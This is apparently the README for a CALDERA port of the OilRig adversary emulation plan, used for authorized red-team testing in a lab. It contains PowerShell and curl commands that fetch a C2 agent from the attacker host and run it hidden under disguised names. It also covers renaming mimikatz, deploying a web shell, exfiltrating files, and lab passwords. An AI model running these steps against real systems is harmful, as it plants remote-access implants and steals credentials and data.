# DEPENDENCIES

## CALDERA C2 Server
- Linux/Mac OS, 64-bit
- git commandline installed
- python3.7+ with pip3
    - python3.9+ recommended
- golang 1.17+
    - required for dynamic agent compilation

## Attacker Machine Dependencies
- Linux OS, 64-bit 
    - Kali recommended
    - Can be the same machine as the CALDERA C2 server if needed.
- Command-line tools
    - xfreerdp
    - xdotools
    - curl

# SETUP

## Download and Install CALDERA
Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server, or the "attacker" host. For the purposes of this walkthrough, the C2 server will have an IP address of 192.168.0.4. 
```
git clone --depth 1 https://github.com/mitre/caldera.git --recursive
cd caldera
git checkout master && git pull
cp conf/default.yml conf/local.yml
```

Add the `emu` plugin add emu to your `conf/local.yml` configuration file. Feel free to enable or disable other plugins
by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.
```
vi conf/local.yml
```

Download pip dependencies.
```
pip3 install --upgrade setuptools
pip3 install --upgrade pip
pip3 install -r requirements.txt
```

Download required payloads for `emu` plugin.
```
# from caldera/plugins/emu directory 

git checkout master && git pull
./download_payloads.sh
```

Run your C2 server from the caldera directory. This will unzip encrypted executables throughout the `adversary-emulation-library` and ingest its emulation plans.
```
# from caldera directory

python3 server.py --insecure --log DEBUG
```

Update payload name for mimikatz to `m64.exe`. **Note:** this may require a server restart for Caldera to pick up the new payload.
```
# from caldera/plugins/emu directory

cp payloads/mimikatz.exe m64.exe
```

# RUNNING THE OPERATION

## Launch Agents

Launch the first agent by running the following command on 10.1.0.5 (THEBLOCK) as the user `gosta`. The password for `gosta` is `d0ntGoCH4ingW8trfalls`. Note that you may need to replace `gosta` with the applicable username, if you are not using the `gosta` user. This agent is meant to replace SideTwist payload used in the original scenario.

```
mkdir  "C:\Users\gosta\AppData\local\SystemFailureReporter";
cd  "C:\Users\gosta\AppData\local\SystemFailureReporter";
$server="http://192.168.0.4:8888"; # change IP address for your CALDERA C2 server according to your environment
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\SystemFailureReporter.exe"} | stop-process -f;
rm -force "C:\Users\Public\SystemFailureReporter.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\SystemFailureReporter.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\SystemFailureReporter.exe -ArgumentList "-server $server -group gosta" -WindowStyle hidden;
```

RDP to 192.168.0.4, the Kali attacker host, as user `saka` with password `ceKa#zUUc4^9yZ`. You may need to modify the command so the `server` value matches your attacker host's IP address. Launch the second agent by running the following command. **Note:** keep this RDP open as this will be leveraged by `xfreerdp` in the executed Caldera operation.
```
# from the caldera directory

cd "plugins/emu/data/adversary-emulation-library/oilrig/Resources/payloads/TwoFace";
server="http://192.168.0.4:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group kali -v
```

Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is `red`, default password is `admin`).

Make sure you can see your agents after clicking the `agents` option on the menu on the left, under "Campaigns".

For best results, make sure you don't have other agents currently beaconing in.

## Planner
This port requires CALDERA to run each ability on a specific agent. For example, some abilities should run only on the `gosta` group of agents, while other abilities should run only on the `kali` group of agents. Therefore, this port uses a [custom planner](Emulation_Plan/yaml/planners/oilrig_planner.yml) which specifies the agent group that should run each ability. 

The commands to start agents will include a `-group` flag to specify the agent's group. This group will correspond to the group listed in the custom planner. If the groups that are specified in [Launch Agents](#launch-agents) are edited, the group names in the planner will need to be updated correspondingly. 

## Fact Setup
Before running the operation, you will need to make sure that the OilRig fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under `Configuration`, select `fact sources`. Under the "Select a source" drop-down menu, select `OilRig (Emu)`, which is the fact source for the OilRig adversary. From there, update the following facts as needed:

- `initial.target.user`: The username of the initial target.
- `initial.target.password`: The password of the initial target.
- `second.target.host`: The hostname address of the second target.
- `second.target.ip`: The IPv4 address of the Exchange server.
- `network.domain.name`: The network domain name for initial target system
- `caldera.server.ip`: The IPv4 address of the attacker system.
- `caldera.user.password`: The password for the attacker system.
- `caldera.user.name`: The username of the attacker system.
- `second.target.user`: The username for the SQL server administrator.
- `second.target.ntlm`: NTLM hash value for the user of the SQL server administrator.
- `third.target.ip`: The IPv4 address of the SQL server.
- `exfil.target.email`: The adversary-controlled email address used to exfiltrate data.
- `server.api.key`: The API key for the CALDERA server.

## Operation Setup
After adjusting the fact source as needed, select `operations` from the left menu, under "Campaigns".

Select "+ Create Operation" to the right of the drop-down menu.

Add in an appropriate name for your operation.

For the adversary profile, select `OilRig`.

For the Fact Source, select `OilRig (Emu)`.

Select `Advanced` to expand the Advanced configurations.

For `Group`, make sure `All Groups` is selected.

For the Planner, select `OilRig Planner`.

Make sure the `plain-text` obfuscator is selected.

For Autonomous, make sure "Run Autonomously" is selected.

For the Parser, select "Do not use default parsers".

For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.

For Run state, make sure "Run immediately" is selected.

Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.

Keep visibility at 51.

When ready, hit the Start button and wait for your operation to complete.

# TERMINATING THE OPERATION

Press the stop button in the operation GUI to finish the operation. Terminate the Kali agent from the GUI or RDP/SSH into the machine to stop the agent processes.

## Cleanup

The following commands should be run on 10.1.0.5 (THEBLOCK):

```
del C:\Users\Public\contact.aspx;
del C:\Users\gosta\AppData\local\SystemFailureReporter;
del C:\Users\Public\SystemFailureReporter.exe;
```

## Exfiltrated Files
Throughout the operation, some files will be exfiltrated through a CALDERA agent back to the CALDERA server. 

The directory on the CALDERA server machine that contains the uploaded files depends on the `exfil_dir` setting within the CALDERA configuration file (`/tmp/caldera` by default). Within this exfil directory, you'll find a subdirectory of the format `hostname-agentidentifier`, where `hostname` is the hostname where the agent was running, and the agent identifier is the unique identifier for the agent. The encrypted uploaded files will be in that subdirectory.

To decrypt the uploaded files, you can use the decryption utility provided in `app/utility/file_decryptor.py` within the CALDERA main directory. Run it and pass in the path to the CALDERA configuration file used (e.g. `default.yml` or `local.yml`) as well as the path to the input file and output file (change file paths in the example as needed).
```
python3 ~/caldera/app/utility/file_decryptor.py -c ~/caldera/conf/local.yml /tmp/caldera/gammu-agent123/encrypted_exfil.file decrypted_exfil.file
```

# MODIFICATIONS/DEVIATIONS FROM THE ORIGINAL EMULATION PLAN

## Step 1
- Initial access will be performed by running a CALDERA agent executable named `SystemFailureReporter.exe`, rather than a malicious Word document with VBA macros. The agent will act as the remote access implant and is a compiled `.exe` written in Golang. 
    - The SideTwist payload, `update.xml`, and `b.doc` will not be used
    - `SystemFailureReporter.exe` as used in evals will be replaced by the CALDERA agent named `SystemFailureReporter.exe`.
- Following initial access, the agent will use two VBS scripts to collect the `hostname` and `username` environment variables, mimicking the macro used in evals.
- The agent will not perform sandbox detection checks using `Application.MouseAvailable`. 
- The agent will not use GetUserName API, GetComputerName API, and GetDomainName API to find the current user, hostname, and domain respectively.

## Step 2
- The CALDERA agent will run all of the commands in Step 2 via `cmd.exe`. However, the commands will be executed separately instead of being chained together. From a defender's viewpoint, the port's execution will appear as:
    ```
    SystemFailureReporter.exe executed cmd.exe /C whoami
    SystemFailureReporter.exe executed cmd.exe /C hostname
    SystemFailureReporter.exe executed cmd.exe /C ipconfig /all
    ...
    ```
    as opposed to the scenario's execution, which would have appeared as:
    ```
    SystemFailureReporter.exe executed cmd.exe whoami & hostname & ipconfig /all ... 2>&1
    ```

## Step 3
- `b.exe` will be downloaded to the workstation as a payload from the CALDERA server. In the port, `b.exe` will be automatically deleted when it stops running, as opposed the original scenario, where `b.exe` is deleted in Step 11.
- `fsociety.dat` will be exfiltrated via the C2 channel to the CALDERA exfil directory, which is by default `/tmp/caldera` on the CALDERA server host. More information regarding exfiltrated files is available [above](#exfiltrated-files).

## Step 4
- `Contact.aspx` will be uploaded as a payload to the CALDERA server. It will be downloaded to THEBLOCK through the C2 channel, and will then be copied to the WATERFALLS Exchange Web Services directory. In the original scenario, `contact.aspx` is downloaded directly to the `C:\Users\Public\` directory on THEBLOCK. However, in the port, CALDERA will download `contact.aspx` to the agent's current directory, which will be `C:\Users\gosta\AppData\Local\SystemFailureReporter\`. Then, Step 4.A.1 will copy the file from `C:\Users\gosta\AppData\Local\SystemFailureReporter\` to `C:\Users\Public\`. 
- The ability labeled as Step 4.A.2 "Server Software Component: Web Shell" (T1505.003) includes Step 4.A.3, "Hide Artifacts: Hidden Files & Directories" (T1564.001).
- Step 4.A.5, "Indicator Removal on Host: File Deletion" (T1070.004) will be included in the cleanup command for Step 4.A.1.

## Step 5
 - This step will be performed by the agent that was manually launched on the "attacker" system.
 - The `-s` flag was added to the curl commands to activate "silent" mode. This restricts the progress meter from displaying in order to allow CALDERA GUI to properly capture terminal output. The `-s` flag will also restrict error messages from appearing.
 - In this step and in all following steps, the password for `gosta` has been changed from `d0ntGoCH4$ingW8trfalls` to `d0ntGoCH4ingW8trfalls`.  

## Step 6
 - The `-s` flag was added to the curl commands to activate "silent" mode. This restricts the progress meter from displaying in order to allow CALDERA GUI to properly capture terminal output. The `-s` flag will also restrict error messages from appearing.

## Step 7
- `plink.exe` will be downloaded to the workstation as a payload from the CALDERA server. In the original scenario, `plink.exe` is initially downloaded to `C:\Users\Public\Downloads\plink.exe`. In the port, it will be downloaded through the C2 channel to the same folder as the agent on the `THEBLOCK`. Then, it will be copied to the `Downloads` folder.
- The additional `-no-antispoof` flag was added to avoid the required interaction step.
- Step 7.A.3, "Valid Accounts: Domain Accounts" (T1078.002) is included in Step 7.A.4. 
- Steps 7.A.2 and 7.A.4 are run using `exec-background` which runs a command as a background process. The `/cert-ignore` parameter is also added to Step 7.A.4. 
- The password for `saka` has been changed from `$ceKa#zU$Uc4^9yZ` to `ceKa#zUUc4^9yZ`.  

## Step 8
- `xdotool` is used to control the RDP session to `10.1.0.6`. Because `xdotool` controls a remote system using pre-determined key presses, the sequence of key presses in Step 8 may need to be modified depending on your environment. 
- Step 8.A.9 includes Steps 8.A.5 through 8.A.8. 

## Step 9
- In continuation from Step 8, `xdotool` is used to control the RDP session.

## Step 10
- In continuation from Step 8, `xdotool` is used to control the RDP session.
- Step 10.A.6 includes Steps 10.A.1-10.A.6

## Step 11
- Because the `gosta` agent replaces SideTwist, the `gosta` agent will be killed instead of killing SideTwist. Additionally, `update.xml` was not used in the port so it does not need to be deleted in the cleanup stage.
- The API key fact value may need to be updated to your server's API key in order to modify the `gosta` agent's watchdog value, which then kills the agent.
- `b.exe` was saved to agent's location as a payload, was run from that location, and was automatically deleted when the command finished. Therefore, it will not be deleted in this step.
